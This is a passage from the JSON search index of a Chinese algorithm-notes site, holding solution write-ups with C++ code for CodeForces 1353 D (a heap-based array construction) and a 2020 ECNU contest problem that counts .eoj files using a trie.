Array"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#_1","text":"CodeForces 1353 D. Constructing the Array \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Onput 1.5. Sample Input 1.6. Sample Onput 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#11-limit","text":"Time Limit: 1 second Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#12-problem-description","text":"You are given an array a of length n consisting of zeros. You perform n actions with this array: during the i -th action, the following sequence of operations appears: Consider the array a of length 5 (initially a=[0, 0, 0, 0, 0] ). Then it changes as follows: Firstly, we choose the segment [1; 5] and assign a[3] := 1 , so a becomes [0, 0, 1, 0, 0] ; then we choose the segment [1; 2] and assign a[1] :=2 , so a becomes [2, 0, 1, 0, 0] ; then we choose the segment [4; 5] and assign a[4] := , so a becomes [2, 0, 1, 3, 0] ; then we choose the segment [2; 2] and assign a[2] :=4 , so a becomes [2, 4, 1, 3, 0] ; and at last we choose the segment [5; 5] and assign a[5] := 5 , so a becomes [2, 4, 1, 3, 5] . Your task is to find the array a of length n after performing all n actions. Note that the answer exists and unique . You have to answer t independent test cases.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#13-input","text":"The first line of the input contains one integer t ( 1 \\le t \\le 10^4 ) \u2014 the number of test cases. Then t test cases follow. The only line of the test case contains one integer n ( 1 \\le n \\le 2 \\cdot 10^5 ) \u2014 the length of a . It is guaranteed that the sum of n over all test cases does not exceed 2 \\cdot 10^5 ( \\sum n \\le 2 \\cdot 10^5 ).","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#14-onput","text":"For each test case, print the answer \u2014 the array a of length n after performing n actions described in the problem statement. Note that the answer exists and unique .","title":"1.4. Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#15-sample-input","text":"6 1 2 3 4 5 6","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#16-sample-onput","text":"1 1 2 2 1 3 3 1 2 4 2 4 1 3 5 3 4 1 5 2 6","title":"1.6. Sample Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#17-source","text":"CodeForces 1353 D. Constructing the Array","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#2","text":"\u7528\u4f18\u5148\u961f\u5217 priority_queue \u6839\u636e\u533a\u95f4\u957f\u5ea6\u6784\u9020\u5927\u9876\u5806\u3002 \u6bcf\u6b21\u53d6\u51fa\u5806\u9876\u7684\u533a\u95f4\u5143\u7d20\u8fdb\u884c\u8d4b\u503c\uff0c\u6bcf\u6b21\u8d4b\u503c\u5b8c\u4ee5\u540e\uff0c\u5c06\u5de6\u5b50\u533a\u95f4\u548c\u53f3\u5b50\u533a\u95f4\u653e\u5165\u5806\u4e2d\u3002\u548c\u5206\u6cbb\u6cd5\u7684\u601d\u60f3\u6bd4\u8f83\u7c7b\u4f3c\u3002 \u91cd\u590d\u4ee5\u4e0a\u6b65\u9aa4\u76f4\u5230\u5806\u4e3a\u7a7a\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#3","text":"#include <algorithm> #include <iostream> #include <queue> #include <string.h> const long long num = 2 * 1e5 + 1; using namespace std; // \u5b9a\u4e49\u6570\u636e\u7c7b\u578b #define llpair pair<long long, long long> // \u5b58\u50a8 long long list[num]; // \u6807\u8bb0\u5f53\u524d\u6570\u5b57\u4e2a\u6570 long long markNum; // \u961f\u5217\u957f\u5ea6 long long n; // \u5b9a\u4e49\u6392\u5e8f\u65b9\u6cd5 struct cmp { bool operator()(llpair a, llpair b) { if ((a.second - a.first) != (b.second - b.first)) { // \u8fd4\u56de\u5c0f\u4e8e\u5224\u65ad\u65f6\uff0c\u662f\u5927\u9876\u5806\uff0c\u4e0equeue\u76f8\u53cd return (a.second - a.first) < (b.second - b.first); } else { // \u8fd4\u56de\u5927\u4e8e\u53f7\u65f6\uff0c\u8f83\u5c0f\u7684\u5143\u7d20\u5728\u524d return a.first > b.first; } } }; // \u4f7f\u7528\u4f18\u5148\u961f\u5217\u6784\u9020\u5927\u9876\u5806 priority_queue<llpair, vector<llpair>, cmp> qu; // \u5b9a\u4e49\u6e05\u96f6\u51fd\u6570 void clear(priority_queue<llpair, vector<llpair>, cmp>& q) { priority_queue<llpair, vector<llpair>, cmp> empty; swap(empty, q); } // \u5206\u6cbb\u6cd5 void divideAndConquer(long long array[]) { while (!qu.empty()) { // \u83b7\u53d6\u6700\u5927\u533a\u95f4 llpair pairBuffer = qu.top(); // \u51fa\u961f qu.pop(); // \u83b7\u53d6\u961f\u9996\u5143\u7d20 long long low = pairBuffer.first; long long high = pairBuffer.second; // \u8ba1\u7b97\u4e2d\u503c long long mid = low + (high - low) / 2; if (low <= high && mid > 0 && array[mid] == 0) { array[mid] = markNum; markNum++; } // \u5165\u961f if (low <= mid - 1) qu.push(make_pair(low, mid - 1)); if (mid + 1 <= high) qu.push(make_pair(mid + 1, high)); } } int main() { // test case long long t; // long long n; // test case scanf(\"%lld\", &t); // for each test case while (t--) { // \u521d\u59cb\u5316 markNum = 1; memset(list, 0, sizeof(list)); clear(qu); // \u8f93\u5165 scanf(\"%lld\", &n); // \u8ba1\u7b97 qu.push(make_pair(1, n)); divideAndConquer(list); // \u8f93\u51fa for (int i = 1; i <= n; i++) { printf(\"%lld \", list[i]); } printf(\"\\n\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/","text":"2020 ECNU Campus Online Invitational Contest Problem F. Find / -type f -or -type d # \u76ee\u5f55 # 2020 ECNU Campus Online Invitational Contest Problem F. Find / -type f -or -type d \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1 1.6. Sample Onput 1 1.7. Sample Input 2 1.8. Sample Onput 2 1.9. Sample Input 3 1.10. Sample Onput 3 1.11. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1.5 sec Memory Limit: 1024 MB 1.2. Problem Description # Cuber QQ wants to know the number of files with extension .eoj in his computer. This can be easily done with a command find / -type f | grep \u2019n.eoj$\u2019 | wc -l. However, Cuber QQ is a grep-hater, who would rather write his own program than using grep. So he decides to take a detour: what if the command starts with something else? Is it still possible to recover the results? If you are not familiar with command usages in Linux, all you need to know is that ls and find are two easy-to-use commands to inspect files and subdirectories a directory contains. For example, when you are trying to get a list of everything in your computer, you might try to use: find / -type f -or -type d, which will give you a list like: \\text{Figure 1. Example} To make the problem even more interesting, Cuber QQ adds another shuf after find, so that the list is shuffled into a random order and his secrets will stay covered. Cuber QQ is wondering whether it\u2019s possible to write a program cuber-qq-grep that filters out all the files with extension .eoj from the given shuffled list, which is his initial intention. Still, instead of giving the filtered list directly, Cuber QQ wants to know the length of this list, i.e., the number of files found. In other words, the following two commands will be almost equivalent: find / -type f | grep \u2019n.eoj$\u2019 | wc -l find / -type f -or -type d | shuf | cuber-qq-grep Well, there can be some subtle differences in input/output formats, but that\u2019s not essential. One more thing, on your file system, directory is only a logical concept. This means, a directory is created only when there is a file which relies on this directory is created and a directory cannot exist without files. TL;DR, given the randomly shuffled list of all directories and files on a computer, count the number of files that ends with .eoj. 1.3. Input # The input starts with a line of one number n (1 \\le n \\le 10^5) , which is the length of the following list. In the following n lines, each line contains one string, which is an absolute path to a file or a directory. The path starts with /, and is composed of multiple tokens (file names and directory names) concatenated with /. The tokens always start with a lowercase letter, followed by no more than 9 lowercase letters or dots. The root folder alone will not be included in this list. It is guaranteed that the total length of n lines will be no longer than 10^6 . 1.4. Output # Output the number of files satisfying the above-mentioned condition, in one line. 1.5. Sample Input 1 # 3 /secret/eoj /secret /secret.eoj 1.6. Sample Onput 1 # 1 1.7. Sample Input 2 # 8 /i/am/an/ecnu/student /i/am/an/ecnu /i /i/am/a /i/am/an/idiot /i/am/an /i/am/a/genious /i/am 1.8. Sample Onput 2 # 0 1.9. Sample Input 3 # 2 /cuber.eoj/qq.eoj /cuber.eoj 1.10. Sample Onput 3 # 1 1.11. Source # 2020 ECNU Campus Online Invitational Contest Problem F. Find / -type f -or -type d 2. \u89e3\u8bfb # \u9898\u76ee\u8981\u6c42\u627e\u51fa\u6240\u6709 .eoj \u540e\u7f00\u7684\u6587\u4ef6\u6570\u91cf\uff0c\u4e0d\u8fc7\u5982\u679c\u5b58\u5728 xxx.eoj/www \u8fd9\u6837\u7684\u8def\u5f84\uff0c\u8bf4\u660e xxx.eoj \u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u9700\u8981\u628a\u5b83\u4ece\u7b54\u6848\u4e2d\u53bb\u9664\u6389\u3002 \u4f7f\u7528\u5b57\u5178\u6811\u8fdb\u884c\u5b58\u50a8\uff0c\u5c06\u6240\u6709 .eoj \u540e\u7f00\u7684\u8def\u5f84\u5b58\u8fdb\u4e00\u4e2a set \u5f53\u4e2d\uff0c\u6700\u540e\u5bf9 set \u8fdb\u884c\u904d\u5386\uff0c\u5982\u679c\u5728\u5b57\u5178\u6570\u4e2d\u4ee5 set[i] \u4e3a\u524d\u7f00\u7684\u6587\u4ef6\u6570\u91cf\u5927\u4e8e 1 \uff0c\u5373 set[i] \u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u5219\u628a\u5b83\u4ece\u7b54\u6848\u4e2d\u53bb\u9664\u3002 \u7528\u4ee5\u4e0b\u8f93\u5165\u4e3a\u4f8b\u3002 /a.eoj /fg /bcd.e \u6784\u5efa\u51fa\u7684\u5b57\u5178\u6811\u7ed3\u6784\u5982\u56fe2\u6240\u793a\u3002 \\text{Figure 2. \u5b57\u5178\u6811} 3. \u4ee3\u7801 # #include <iostream> #include <set> #include <string.h> using namespace std; const int NUM = 1e6 + 1; // \u7528\u6570\u7ec4\u5b9a\u4e49\u5b57\u5178\u6811\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e int trie[NUM][28]; // \u4ee5\u67d0\u4e00\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int num[NUM] = { 0 }; // \u5f53\u524d\u65b0\u5206\u914d\u7684\u5b58\u50a8\u4f4d\u7f6e int pos = 1; // \u5b58\u50a8\u7ed3\u679c set<string> st; // \u5728\u5b57\u5178\u6570\u4e2d\u63d2\u5165\u67d0\u4e2a\u5355\u8bcd void trieInsert(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n; if (str[i] == '/') { n = 26; } else if (str[i] == '.') { n = 27; } else { n = str[i] - 'a'; } if (trie[p][n] == 0) { // \u5982\u679c\u5bf9\u5e94\u5b57\u7b26\u6ca1\u6709\u503c\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u7d22\u5f15\u7684\u503c trie[p][n] = pos++; } p = trie[p][n]; num[p]++; } } // \u8fd4\u56de\u4ee5\u67d0\u4e2a\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int trieFind(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n; if (str[i] == '/') { n = 26; } else if (str[i] == '.') { n = 27; } else { n = str[i] - 'a'; } if (trie[p][n] == 0) { return 0; } p = trie[p][n]; } return num[p]; } // \u5148\u63d2\u5165trie\u6811\uff0c\u518d\u627e\u6bcf\u4e2a.eoj\u7ed3\u5c3e\u7684\u6587\u4ef6\u662f\u5426\u6709\u540e\u7f00\uff0c\u82e5\u6709\u5219\u5220\u53bb int main() { int t, length, ans = 0; cin >> t; string str; while (t--) { cin >> str; // \u63d2\u5165trie\u6811 trieInsert(str); if ((length = str.length()) >= 4 && str.substr(length - 4, length) == \".eoj\") { st.insert(str); ans++; } } // \u53bb\u9664\u6587\u4ef6\u5939 for (auto it = st.begin(); it != st.end(); it++) { if (trieFind(*it) > 1) { // \u8fd9\u91cc\u4e0d\u80fd\u7528st.erase\uff0c\u63a8\u6d4b\u662f\u56e0\u4e3aset\u4f7f\u7528\u7684\u662f\u7c7b\u4f3c\u94fe\u8868\u7684\u5b58\u50a8\u7ed3\u6784 // \u628a\u8fd9\u4e2a\u5143\u7d20\u53bb\u9664\u4ee5\u540e\uff0c\u5c31\u627e\u4e0d\u5230\u4e0b\u4e00\u4e2a\u5143\u7d20\u6307\u9488\u4e86 // st.erase(it); ans--; } } cout << ans << endl; return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.2020 \u6e38\u65cf\u676f F"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#2020-ecnu-campus-online-invitational-contest-problem-f-find-type-f-or-type-d","text":"","title":"2020 ECNU Campus Online Invitational Contest Problem F. Find / -type f -or -type d"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#_1","text":"2020 ECNU Campus Online Invitational Contest Problem F. Find / -type f -or -type d \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1 1.6. Sample Onput 1 1.7. Sample Input 2 1.8. Sample Onput 2 1.9. Sample Input 3 1.10. Sample Onput 3 1.11. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#11-limit","text":"Time Limit: 1.5 sec Memory Limit: 1024 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#12-problem-description","text":"Cuber QQ wants to know the number of files with extension .eoj in his computer. This can be easily done with a command find / -type f | grep \u2019n.eoj$\u2019 | wc -l. However, Cuber QQ is a grep-hater, who would rather write his own program than using grep. So he decides to take a detour: what if the command starts with something else? Is it still possible to recover the results? If you are not familiar with command usages in Linux, all you need to know is that ls and find are two easy-to-use commands to inspect files and subdirectories a directory contains. For example, when you are trying to get a list of everything in your computer, you might try to use: find / -type f -or -type d, which will give you a list like: \\text{Figure 1. Example} To make the problem even more interesting, Cuber QQ adds another shuf after find, so that the list is shuffled into a random order and his secrets will stay covered. Cuber QQ is wondering whether it\u2019s possible to write a program cuber-qq-grep that filters out all the files with extension .eoj from the given shuffled list, which is his initial intention. Still, instead of giving the filtered list directly, Cuber QQ wants to know the length of this list, i.e., the number of files found. In other words, the following two commands will be almost equivalent: find / -type f | grep \u2019n.eoj$\u2019 | wc -l find / -type f -or -type d | shuf | cuber-qq-grep Well, there can be some subtle differences in input/output formats, but that\u2019s not essential. One more thing, on your file system, directory is only a logical concept. This means, a directory is created only when there is a file which relies on this directory is created and a directory cannot exist without files. TL;DR, given the randomly shuffled list of all directories and files on a computer, count the number of files that ends with .eoj.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#13-input","text":"The input starts with a line of one number n (1 \\le n \\le 10^5) , which is the length of the following list. In the following n lines, each line contains one string, which is an absolute path to a file or a directory. The path starts with /, and is composed of multiple tokens (file names and directory names) concatenated with /. The tokens always start with a lowercase letter, followed by no more than 9 lowercase letters or dots. The root folder alone will not be included in this list. It is guaranteed that the total length of n lines will be no longer than 10^6 .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#14-output","text":"Output the number of files satisfying the above-mentioned condition, in one line.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#15-sample-input-1","text":"3 /secret/eoj /secret /secret.eoj","title":"1.5. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#16-sample-onput-1","text":"1","title":"1.6. Sample Onput 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#17-sample-input-2","text":"8 /i/am/an/ecnu/student /i/am/an/ecnu /i /i/am/a /i/am/an/idiot /i/am/an /i/am/a/genious /i/am","title":"1.7. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#18-sample-onput-2","text":"0","title":"1.8. Sample Onput 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#19-sample-input-3","text":"2 /cuber.eoj/qq.eoj /cuber.eoj","title":"1.9. Sample Input 3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#110-sample-onput-3","text":"1","title":"1.10. Sample Onput 3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#111-source","text":"2020 ECNU Campus Online Invitational Contest Problem F. Find / -type f -or -type d","title":"1.11. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#2","text":"\u9898\u76ee\u8981\u6c42\u627e\u51fa\u6240\u6709 .eoj \u540e\u7f00\u7684\u6587\u4ef6\u6570\u91cf\uff0c\u4e0d\u8fc7\u5982\u679c\u5b58\u5728 xxx.eoj/www \u8fd9\u6837\u7684\u8def\u5f84\uff0c\u8bf4\u660e xxx.eoj \u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u9700\u8981\u628a\u5b83\u4ece\u7b54\u6848\u4e2d\u53bb\u9664\u6389\u3002 \u4f7f\u7528\u5b57\u5178\u6811\u8fdb\u884c\u5b58\u50a8\uff0c\u5c06\u6240\u6709 .eoj \u540e\u7f00\u7684\u8def\u5f84\u5b58\u8fdb\u4e00\u4e2a set \u5f53\u4e2d\uff0c\u6700\u540e\u5bf9 set \u8fdb\u884c\u904d\u5386\uff0c\u5982\u679c\u5728\u5b57\u5178\u6570\u4e2d\u4ee5 set[i] \u4e3a\u524d\u7f00\u7684\u6587\u4ef6\u6570\u91cf\u5927\u4e8e 1 \uff0c\u5373 set[i] \u662f\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u5219\u628a\u5b83\u4ece\u7b54\u6848\u4e2d\u53bb\u9664\u3002 \u7528\u4ee5\u4e0b\u8f93\u5165\u4e3a\u4f8b\u3002 /a.eoj /fg /bcd.e \u6784\u5efa\u51fa\u7684\u5b57\u5178\u6811\u7ed3\u6784\u5982\u56fe2\u6240\u793a\u3002 \\text{Figure 2. \u5b57\u5178\u6811}","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E5%85%B8%E6%A0%91/1.2020_%E6%B8%B8%E6%97%8F%E6%9D%AF_F/#3","text":"#include <iostream> #include <set> #include <string.h> using namespace std; const int NUM = 1e6 + 1; // \u7528\u6570\u7ec4\u5b9a\u4e49\u5b57\u5178\u6811\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e int trie[NUM][28]; // \u4ee5\u67d0\u4e00\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int num[NUM] = { 0 }; // \u5f53\u524d\u65b0\u5206\u914d\u7684\u5b58\u50a8\u4f4d\u7f6e int pos = 1; // \u5b58\u50a8\u7ed3\u679c set<string> st; // \u5728\u5b57\u5178\u6570\u4e2d\u63d2\u5165\u67d0\u4e2a\u5355\u8bcd void trieInsert(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n; if (str[i] == '/') { n = 26; } else if (str[i] == '.') { n = 27; } else { n = str[i] - 'a'; } if (trie[p][n] == 0) { // \u5982\u679c\u5bf9\u5e94\u5b57\u7b26\u6ca1\u6709\u503c\uff0c\u5b58\u50a8\u4e0b\u4e00\u4e2a\u7d22\u5f15\u7684\u503c trie[p][n] = pos++; } p = trie[p][n]; num[p]++; } } // \u8fd4\u56de\u4ee5\u67d0\u4e2a\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00\u7684\u5355\u8bcd\u7684\u6570\u91cf int trieFind(string str) { int p = 0; for (int i = 0; str[i]; i++) { int n; if (str[i] == '/') { n = 26; } else if (str[i] == '.') { n = 27; } else { n = str[i] - 'a'; } if (trie[p][n] == 0) { return 0; } p = trie[p][n]; } return num[p]; } // \u5148\u63d2\u5165trie\u6811\uff0c\u518d\u627e\u6bcf\u4e2a.eoj\u7ed3\u5c3e\u7684\u6587\u4ef6\u662f\u5426\u6709\u540e\u7f00\uff0c\u82e5\u6709\u5219\u5220\u53bb int main() { int t, length, ans = 0; cin >> t; string str; while (t--) { cin >> str; // \u63d2\u5165trie\u6811 trieInsert(str); if ((length = str.length()) >= 4 && str.substr(length - 4, length) == \".eoj\") { st.insert(str); ans++; } } // \u53bb\u9664\u6587\u4ef6\u5939 for (auto it = st.begin(); it != st.end(); it++) { if (trieFind(*it) > 1) { // \u8fd9\u91cc\u4e0d\u80fd\u7528st.erase\uff0c\u63a8\u6d4b\u662f\u56e0\u4e3aset\u4f7f\u7528\u7684\u662f\u7c7b\u4f3c\u94fe\u8868\u7684\u5b58\u50a8\u7ed3\u6784 // \u628a\u8fd9\u4e2a\u5143\u7d20\u53bb\u9664\u4ee5\u540e\uff0c\u5c31\u627e\u4e0d\u5230\u4e0b\u4e00\u4e2a\u5143\u7d20\u6307\u9488\u4e86 // st.erase(it); ans--; } } cout << ans << endl; return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/1.%E8%AE%A1%E8%92%9C%E5%AE%A2_T1112_%E5%8A%A0%E5%AF%86%E7%9A%84%E7%97%85%E5%8E%86%E5%8D%95/","text":"\u8ba1\u849c\u5ba2 T1112 \u52a0\u5bc6\u7684\u75c5\u5386\u5355 # \u76ee\u5f55 # \u8ba1\u849c\u5ba2 T1112 